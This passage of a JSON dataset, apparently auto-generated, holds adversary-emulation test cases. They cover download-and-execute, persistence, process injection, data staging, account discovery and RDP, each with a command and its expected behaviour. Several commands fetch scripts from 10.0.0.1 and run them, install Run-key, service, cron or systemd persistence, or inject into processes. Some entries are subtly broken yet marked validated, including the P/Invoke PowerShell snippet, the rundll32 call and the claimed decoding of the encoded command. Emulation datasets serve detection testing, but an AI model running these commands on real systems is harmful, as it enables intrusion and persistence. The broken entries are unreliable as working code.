      "description": "Download a Base64-encoded Unicode PowerShell command, decode, and execute",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Fetches a Base64-encoded string containing a UTF-8 representation of a Base64-encoded Unicode PowerShell command. Decodes and executes it. This simulates use of custom proxies delivering encoded payloads. No .NET reflection is used; standard .NET classes via New-Object are allowed. Errors are suppressed for stealth. The executed command is benign in test context.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.326230",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "af898f67-cb59-4a07-abb9-68d7e27fbac9",
      "ttp_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "linux",
      "command": "wget -q -O /tmp/deploy.sh http://10.0.0.1:8000/proxy-deploy && chmod +x /tmp/deploy.sh && /tmp/deploy.sh",
      "description": "Basic download and execution of a deployment script via wget from a local web server",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a shell script from a local server, makes it executable, and runs it. Simulates initial access via web-deployed proxy.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:55:13.038418",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "655f4ae5-34cd-40c2-bbd2-05d5bffe3024",
      "ttp_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "linux",
      "command": "curl -s http://10.0.0.1:8000/enc-deploy.b64 | base64 -d > /tmp/stage.sh && chmod 700 /tmp/stage.sh && sh /tmp/stage.sh",
      "description": "Intermediate: Downloads a base64-encoded script, decodes it, and executes",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Fetches an encoded deployment script over HTTP, decodes it to a file, sets permissions, and executes using sh. Simulates use of custom-encoded components for deployment.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:55:13.038418",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "fa9a2abf-21f8-4f03-b847-5d1146dcaef6",
      "ttp_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "linux",
      "command": "mkdir -p /tmp/.cache && echo 'IyEvYmluL3NoCmVjaG8gIlNpbXVsYXRlZCBkZXBsb3kgc2NyaXB0Ig==' | base64 -d > /tmp/.cache/update.sh && chmod +x /tmp/.cache/update.sh && nohup /tmp/.cache/update.sh &",
      "description": "Advanced: Simulates deployment via embedded base64 payload and background execution",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a hidden directory, writes a base64-decoded benign script, makes it executable, and runs it in the background. Mimics stealthy software deployment using custom components.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:55:13.038418",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "5dd83366-f71b-4afc-ad3f-0549f63f1ac7",
      "ttp_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "sc.exe create TestService binPath= \"cmd.exe /c echo Test persistence > %TEMP%\\\\service_log.txt\" start= auto",
      "description": "Creates a Windows service named 'TestService' that runs on startup and logs to a file in %TEMP%.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a service that executes cmd.exe on system boot, writing a test message to %TEMP%\\service_log.txt. Requires elevated privileges. Service remains until manually deleted.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.428348",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "d382259d-197d-4113-8fc3-fa867042f18f",
      "ttp_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "schtasks.exe /create /tn \"Updater\" /tr \"cmd.exe /c echo Scheduled task test > %TEMP%\\\\task_log.txt\" /sc onlogon /ru System",
      "description": "Creates a scheduled task named 'Updater' that runs on user logon and writes a test message to %TEMP%.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a task triggered at each logon under SYSTEM context. Logs a test line to %TEMP%\\task_log.txt. Requires admin rights. Task persists until deleted.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.428348",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "e9440aeb-d184-40cd-a190-a3220c3c3d7b",
      "ttp_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '$env:APPDATA\\\\AutoStart' -ErrorAction SilentlyContinue; Set-Content -Path '$env:APPDATA\\\\AutoStart\\\\run.bat' -Value 'cmd.exe /c echo AutoStart test > %TEMP%\\\\autostart_log.txt' -Force; $regPath = 'HKCU:\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'; if (!(Test-Path $regPath)) { New-Item $regPath -Force }; Set-ItemProperty -Path $regPath -Name 'AutoStartApp' -Value '$env:APPDATA\\\\AutoStart\\\\run.bat' -Force\"",
      "description": "Creates a startup script in AppData and registers it in the user's Run key for persistence on login.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a batch file in the current user's AppData and adds a registry entry to execute it at login. Runs with user privileges. Leaves persistent artifact until manually removed from registry and file system.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.429356",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "c86625c3-56eb-48f0-8ea9-1a92dc6db285",
      "ttp_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo '[Unit]\\nDescription=Test Persistence Service\\n[Service]\\nExecStart=/bin/sh -c \"echo \\\"$(date): persistent run\\\" >> /tmp/persistence.log\"\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/test-persistence.service && systemctl daemon-reload && systemctl enable test-persistence.service",
      "description": "Creates a systemd service file to establish persistence via system process",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a systemd service unit file in /etc/systemd/system, reloads the daemon, and enables the service to start at boot. The service appends a timestamped line to /tmp/persistence.log on each start.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:47.703107",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "b8ae88e5-d658-4f75-ad39-47d702f9fc9b",
      "ttp_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "(crontab -l 2>/dev/null; echo '@reboot /bin/sh -c \"echo $(date): cron persistence >> /tmp/cron-persistence.log\"') | crontab -",
      "description": "Adds a cron job for persistence that runs on system reboot",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Appends a @reboot cron job for the current user that writes a timestamped message to /tmp/cron-persistence.log upon each system boot. Does not require root if user has crontab access.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:47.703107",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "47cc9610-ad22-4ee5-82e4-0f298d70b378",
      "ttp_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_name": "Process Injection",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "rundll32.exe kernel32.dll,CreateRemoteThread",
      "description": "Basic process injection attempt using rundll32 to call CreateRemoteThread from kernel32 (benign simulation).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Command executes and may fail silently; rundll32 attempts to call a function that expects specific parameters but is used here to simulate suspicious behavior.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.602575",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.636,
      "validated": true
    },
    {
      "id": "5ef889e6-fc98-4c3f-a0f8-d2ddbc176862",
      "ttp_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_name": "Process Injection",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "regsvr32.exe /s /n /u /i:\"$env:TEMP\\malicious.sct\" scrobj.dll",
      "description": "Intermediate technique using regsvr32 to execute a scriptlet from a local .sct file, simulating DLL-like behavior and potential injection.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "regsvr32 loads scrobj.dll and executes the scriptlet specified in the /i parameter. The .sct file must exist in %TEMP% to run; otherwise, it fails silently due to /s flag.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.602575",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.636,
      "validated": true
    },
    {
      "id": "d086b5de-2e39-47e2-8a1b-579e027b83da",
      "ttp_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_name": "Process Injection",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"try { $dllPath = \"$env:TEMP\\test.dll\"; $proc = Start-Process notepad.exe -PassThru; Start-Sleep -Milliseconds 500; $addr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi('MessageBoxA'); $hKernel32 = [System.Runtime.InteropServices.GetModuleHandle]('kernel32'); $hProc = [System.Runtime.InteropServices.OpenProcess](0x001F0FFF, $false, $proc.Id); [System.Runtime.InteropServices.WriteProcessMemory]($hProc, $addr, [System.Text.Encoding]::ASCII.GetBytes('Injected'), 8, [System.IntPtr]::Zero) } catch { } finally { if ($proc) { Stop-Process -Id $proc.Id -ErrorAction SilentlyContinue } }\"",
      "description": "Advanced simulation of process injection by writing data into a remote process memory using PowerShell P/Invoke (simulated with benign functions).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Starts notepad.exe, attempts to write a benign byte sequence into its memory space using P/Invoke calls, then terminates the process. Uses only built-in .NET interop via PowerShell (not direct .NET reflection) and cleans up the process on exit.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.602575",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.636,
      "validated": true
    },
    {
      "id": "91dd3482-12bf-4fd4-8cc6-ee3da5d3104d",
      "ttp_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_name": "Process Injection",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "LD_PRELOAD=/lib/x86_64-linux-gnu/libpthread.so /bin/echo 'test'",
      "description": "Uses LD_PRELOAD to load a standard shared library into the process environment, simulating a common process injection technique by influencing dynamic linking.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Runs /bin/echo with libpthread preloaded. No actual code injection occurs. Environment is modified before execution, which may trigger detection rules based on LD_PRELOAD usage.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:47.702051",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.636,
      "validated": true
    },
    {
      "id": "70c1a9af-4962-44bb-a590-4e9f10050dfb",
      "ttp_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_name": "Process Injection",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "gdb -batch -ex \"attach $$(pgrep -n sleep)\" -ex \"info proc mappings\" -ex \"detach\" -ex \"quit\" 2>/dev/null || echo 'No target process found'",
      "description": "Uses gdb to attach to a running 'sleep' process to inspect memory mappings, simulating the reconnaissance phase of process injection.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Attaches to the newest 'sleep' process, prints memory layout, then detaches. May fail if no sleep process exists or if ptrace is restricted. Does not inject code but demonstrates capability.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:47.702051",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.636,
      "validated": true
    },
    {
      "id": "c0dc8273-025e-4d6c-a823-28fa5275de2b",
      "ttp_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_id": "b694386e-8977-48fe-8c34-6100e65766ac",
      "technique_name": "Process Injection",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "gdb -batch -ex \"attach $$(pgrep -n sleep)\" -ex \"call (int)system('echo benign')\" -ex \"detach\" -ex \"quit\" 2>/dev/null || echo 'Injection failed or no process'",
      "description": "Uses gdb to call the system() function within a running process context, demonstrating actual function injection via debugger.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Attaches to the newest 'sleep' process and executes a benign system call. This is a real form of runtime code injection. May be blocked by ptrace restrictions. Leaves no persistent changes.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:47.702051",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.636,
      "validated": true
    },
    {
      "id": "16412016-c661-4cd9-9f54-e719fdf7590d",
      "ttp_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "echo testdata > %TEMP%\\collection1.txt && makecab %TEMP%\\collection1.txt %TEMP%\\archive1.cab",
      "description": "Basic: Use legacy 'makecab' utility to archive a single collected data file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a test file in %TEMP% and archives it into a .cab file using makecab. The archive will be created in the temp directory.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.216659",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "56586ec1-1d1e-4ba0-96ed-e5ba799b0ce3",
      "ttp_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "echo testdata1 > %TEMP%\\data_a.txt && echo testdata2 > %TEMP%\\data_b.txt && cmd.exe /c \"dir %TEMP%\\data_*.txt /b > %TEMP%\\filelist.txt\" && makecab @%TEMP%\\filelist.txt %TEMP%\\archive2.cab",
      "description": "Intermediate: Archive multiple collected files using makecab with a file list.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates two test data files, generates a list of them, and archives all listed files into a single .cab archive using makecab.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.216659",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "29bcd188-c9e6-4029-b72d-a9177b441282",
      "ttp_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path '$env:TEMP\\sensitive_data.txt' -Value 'mock credential dump' -Force; Compress-Archive -Path '$env:TEMP\\sensitive_data.txt' -DestinationPath '$env:TEMP\\exfil_archive.zip' -Force -ErrorAction Stop; Remove-Item '$env:TEMP\\sensitive_data.txt' -Force -ErrorAction SilentlyContinue\"",
      "description": "Advanced: Use PowerShell to create and compress sensitive-looking data into a ZIP archive, then remove original file.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a mock sensitive data file in the temp directory, compresses it into a ZIP archive using Compress-Archive, and deletes the original file. The archive remains for exfiltration simulation.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.216659",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "07837f30-02c6-4d18-b764-e77371675e00",
      "ttp_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "cd /tmp && echo 'test data' > collected_data.txt && tar -cf archive.tar collected_data.txt",
      "description": "Basic archiving of collected data using tar",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a test file and archives it into archive.tar in /tmp",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.218540",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "841c9fc6-5bf7-450b-832a-f008605f1a85",
      "ttp_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "cd /tmp && echo 'sensitive_data' > dump.log && tar -czf logs_archive.tar.gz dump.log",
      "description": "Intermediate: Compresses collected logs into a gzipped tar archive",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a log file and compresses it into logs_archive.tar.gz using gzip compression",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.218540",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "09d652f1-f4f5-4f09-ae0f-ad8d8ab8f73f",
      "ttp_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "cd /tmp && echo 'exfil_data' > staging.dat && zip -e archive_password.zip staging.dat",
      "description": "Advanced: Creates password-protected zip archive of collected data",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a data file and prompts interactively for password to create encrypted archive.zip",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.218540",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "e7954a5e-8a41-489c-9fa9-051950d85a58",
      "ttp_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_name": "Account Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "net user",
      "description": "List all local user accounts on the system using the legacy net.exe binary",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of local user accounts to stdout, including built-in accounts like Administrator and Guest",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.173983",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "9a583bd0-fb6f-4124-8acb-c31c35fbf53f",
      "ttp_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_name": "Account Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "net localgroup \"Users\"",
      "description": "Enumerate members of the local 'Users' group using net.exe",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays all users and groups that are members of the local 'Users' group",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.173983",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "2d5351f6-4fb9-4f7d-92bd-d46c48642ef1",
      "ttp_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_name": "Account Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject -Class Win32_UserAccount -Filter 'LocalAccount=True' -ErrorAction SilentlyContinue | Select-Object Name, SID, Disabled | Format-Table -AutoSize\"",
      "description": "Use WMI via PowerShell to retrieve detailed local account information, including SID and disabled status",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists all local user accounts with their Name, SID, and Disabled status in a formatted table; runs without errors even if some properties are inaccessible",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.173983",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "a50700ef-d0ea-4bc4-9328-39d13c9dd4fb",
      "ttp_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_name": "Account Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "cat /etc/passwd",
      "description": "Basic account discovery by reading the /etc/passwd file to list all user accounts.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of all user accounts, including system and regular users, from the /etc/passwd file.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:23.057476",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "0eb6c5da-5b26-4f60-af45-1064637565c5",
      "ttp_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_name": "Account Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "getent passwd",
      "description": "Intermediate account discovery using getent to query the user database, which may include network-based users (e.g., LDAP).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists all user accounts known to the system, including those from local and directory services, in the same format as /etc/passwd.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:23.057476",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "f6743966-985f-4fd5-835d-1f05a8938932",
      "ttp_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
      "technique_name": "Account Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "awk -F: '{print $1}' /etc/passwd",
      "description": "Advanced account discovery using awk to extract only usernames from the /etc/passwd file for cleaner output.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints a concise list of usernames, one per line, parsed from the /etc/passwd file.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:23.057476",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "b914aa07-5b44-4542-91a7-9be4f4ad395c",
      "ttp_id": "54243782-93ba-4ecb-8691-0e4830f78731",
      "technique_id": "54243782-93ba-4ecb-8691-0e4830f78731",
      "technique_name": "Registry Run Keys",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"UpdateCheck\" /t REG_SZ /d \"notepad.exe\" /f",
      "description": "Adds a persistent entry to the current user's Run key to launch notepad.exe on login using reg.exe.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Registry value 'UpdateCheck' is added under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to notepad.exe. Notepad will launch automatically at next user login.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.244016",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "a7cf4463-8779-4f9b-970d-6c7d990aa56f",
      "ttp_id": "54243782-93ba-4ecb-8691-0e4830f78731",
      "technique_id": "54243782-93ba-4ecb-8691-0e4830f78731",
      "technique_name": "Registry Run Keys",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "powershell -Command \"Set-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name 'SyncHost' -Value 'cmd.exe /c echo Hello & timeout /t 10 > nul' -Type String -ErrorAction SilentlyContinue\"",
      "description": "Uses PowerShell to set a user-level Run key with a command-line value that executes a benign delayed echo message.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Registry value 'SyncHost' is created under HKCU Run key with a cmd.exe payload. The command will run at next user logon, displaying 'Hello' and pausing for 10 seconds.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.244016",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "9f8d2833-7fab-4224-baf8-aa37303ca8d2",
      "ttp_id": "54243782-93ba-4ecb-8691-0e4830f78731",
      "technique_id": "54243782-93ba-4ecb-8691-0e4830f78731",
      "technique_name": "Registry Run Keys",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "reg add \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"SystemMaintenance\" /t REG_SZ /d \"powershell -EncodedCommand IAAgAGMAaABrAGMAbwBuAGYAaQBnACAALQBzAGkAbABlAG4AdABsAHkAcABhAHMAcwBpAHYAZQAgACsgACgAIgBiAGwhbmsAIgApACAAPAAvACAAIAAiAGMAaABrAGMAbwBuAGYAaQBnACIAIAAgAA==\" /f",
      "description": "Adds a machine-wide Run key entry using an encoded PowerShell command that runs a harmless chkdsk simulation.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Registry value 'SystemMaintenance' is added under HKLM Run key. The encoded command decodes to ' chkdsk -silentlypassive + (\"blank\") </ \"chkdsk\" ', which simulates a non-disruptive disk check at next boot. Requires admin privileges to modify HKLM.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.244016",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "8e87e1e9-6182-44c5-82b6-d2fce439c8db",
      "ttp_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "mstsc.exe /v:192.168.1.100",
      "description": "Initiate a Remote Desktop connection to a target IP address using mstsc.exe",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Launches the Remote Desktop client and attempts to connect to 192.168.1.100 on port 3389. User will see the RDP login screen if the host is reachable and RDP is enabled.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.220219",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "d99394c6-996b-4f0e-ab75-3b101b8a3cb0",
      "ttp_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "mstsc.exe /v:192.168.1.100:3390 /admin",
      "description": "Connect to a remote system using RDP on a non-standard port with admin session flag",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Launches RDP client to connect to 192.168.1.100 on port 3390 with administrative privileges (console session). Useful when standard RDP port or session limits apply.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.220219",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.623,
      "validated": true
    },
    {
      "id": "e73ad6c6-c1c7-4510-b321-97ee724ee340",
      "ttp_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "echo full address:s:192.168.1.100\\nport:i:3389\\nadmin session:i:1 > $env:TEMP\\connect.rdp && mstsc.exe $env:TEMP\\connect.rdp",
      "description": "Create a temporary RDP configuration file with specific settings and launch connection",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Generates a minimal .rdp file in the user's temp directory with target host, port, and admin session enabled, then launches it via mstsc.exe. File is not cleaned up automatically but poses no risk.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.220219",
